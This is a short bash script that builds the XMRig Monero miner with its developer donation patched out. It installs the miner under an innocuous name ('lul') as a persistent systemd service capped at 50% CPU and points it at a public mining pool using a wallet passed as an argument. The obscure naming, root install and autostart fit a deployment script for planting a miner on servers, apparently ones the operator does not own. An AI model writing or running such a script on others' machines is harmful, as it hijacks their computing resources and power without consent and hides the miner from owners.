#!/bin/bash
apt update
apt upgrade -y
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
git clone https://github.com/xmrig/xmrig.git lul
mkdir lul/build && cd lul/build
perl -pi -e 's/1/0/g' ../src/donate.h
cmake ..
make -j$(nproc)
mv xmrig lul
echo "[Install]
WantedBy=multi-user.target
[Service]
CPUQuota=50%
ExecStart=/root/lul/build/lul" > /etc/systemd/system/lul.service
echo "{
  \"api\": {
    \"id\": null,
    \"worker-id\": null
  },
  \"http\": {
    \"enabled\": false,
    \"host\": \"127.0.0.1\",
    \"port\": 0,
    \"access-token\": null,
    \"restricted\": true
  },
  \"autosave\": true,
  \"version\": 1,
  \"background\": false,
  \"colors\": true,
  \"randomx\": {
    \"init\": -1,
    \"numa\": true
  },
  \"cpu\": {
    \"enabled\": true,
    \"huge-pages\": true,
    \"hw-aes\": null,
    \"priority\": null,
    \"memory-pool\": false,
    \"max-threads-hint\": 100,
    \"asm\": true,
    \"argon2-impl\": null,
    \"cn/0\": false,
    \"cn-lite/0\": false
  },
  \"opencl\": {
    \"enabled\": false,
    \"cache\": true,
    \"loader\": null,
    \"platform\": \"AMD\",
    \"cn/0\": false,
    \"cn-lite/0\": false
  },
  \"cuda\": {
    \"enabled\": false,
    \"loader\": null,
    \"nvml\": true,
    \"cn/0\": false,
    \"cn-lite/0\": false
  },
  \"donate-level\": 0,
  \"donate-over-proxy\": 0,
  \"log-file\": null,
  \"pools\": [
    {
      \"algo\": null,
      \"coin\": null,
      \"url\": \"pool.hashvault.pro:80\",
      \"user\": \"$1\",
      \"pass\": \"$2\",
      \"rig-id\": null,
      \"nicehash\": false,
      \"keepalive\": false,
      \"enabled\": true,
      \"tls\": true,
      \"tls-fingerprint\": \"420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14\",
      \"daemon\": false,
      \"self-select\": null
    }
  ],
  \"print-time\": 60,
  \"health-print-time\": 60,
  \"retries\": 5,
  \"retry-pause\": 5,
  \"syslog\": false,
  \"user-agent\": null,
  \"watch\": true
}" > /root/lul/build/config.json
systemctl start lul.service
systemctl enable lul.service
